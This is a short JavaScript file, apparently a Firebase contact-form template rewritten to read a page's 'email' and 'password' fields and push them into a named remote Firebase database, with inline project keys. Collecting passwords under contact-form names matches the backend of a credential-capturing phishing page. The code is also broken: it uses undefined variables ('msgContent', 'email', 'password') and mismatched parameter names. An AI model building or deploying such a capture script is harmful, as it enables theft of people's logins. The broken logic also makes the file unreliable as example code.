const firebaseConfig = {
    //   copy your firebase config informations
    apiKey: "AIzaSyCOYEbdFqIFfl9u6iJRS2RSUXHN3CWx0tg",
    authDomain: "contact-form-2a96c.firebaseapp.com",
    databaseURL: "https://contact-form-2a96c-default-rtdb.firebaseio.com",
    projectId: "contact-form-2a96c",
    storageBucket: "contact-form-2a96c.appspot.com",
    messagingSenderId: "751151548631",
    appId: "1:751151548631:web:9df77adfbb331acbf18892"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("contactForm");
  
  document.getElementById("contactForm").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var name = getElementVal("email");
    var emailid = getElementVal("password");
  
    saveMessages(name, emailid, msgContent);
  
    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);
  
    //   reset the form
    document.getElementById("contactForm").reset();
  }
  
  const saveMessages = (name, emailid, msgContent) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      email: email,
      password: password
  
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };